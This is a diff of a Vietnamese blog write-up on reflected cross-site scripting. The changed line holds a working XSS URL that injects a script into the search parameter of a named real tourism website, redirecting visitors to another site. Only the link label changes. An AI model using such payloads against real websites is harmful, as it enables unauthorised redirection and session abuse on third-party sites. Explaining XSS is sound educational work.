@@ -28,7 +28,7 @@ Test nhẹ cái script thứ nhất hiển thị alert :D nếu hacker nhúng v�
     </script>
 ```
 Script này hacker sử dụng để chuyển hướng người dùng tới một trang web khác
-+ [https://khudulichdainam.vn/tim-kiem.html?k=%3Cscript%3E%20window.location.replace(%22http://blogth3pr0.github.io%22);%3C/script%3E](https://khudulichdainam.vn/tim-kiem.html?k=%3Cscript%3E%20window.location.replace(%22http://blogth3pr0.github.io%22);%3C/script%3E) 
++ [Link Test](https://khudulichdainam.vn/tim-kiem.html?k=%3Cscript%3E%20window.location.replace(%22http://blogth3pr0.github.io%22);%3C/script%3E) 
 ---
 
 
